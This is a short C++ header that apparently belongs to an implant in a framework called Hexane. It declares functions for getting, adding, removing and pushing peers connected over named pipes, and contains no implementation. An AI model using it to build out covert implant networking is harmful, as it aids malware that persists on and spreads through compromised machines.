#ifndef HEXANE_IMPLANT_CLIENTS_HPP
#define HEXANE_IMPLANT_CLIENTS_HPP
#include <core/corelib.hpp>

namespace Peers {
    PPEER_DATA
    FUNCTION
        GetPeer(UINT32 peer_id);

    BOOL
    FUNCTION
        RemovePeer(UINT32 peer_id);

    BOOL
    FUNCTION
        AddPeer(CONST WCHAR *pipe_name, UINT32 peer_id);

    VOID
    FUNCTION
        PushPeers();
}
#endif //HEXANE_IMPLANT_CLIENTS_HPP
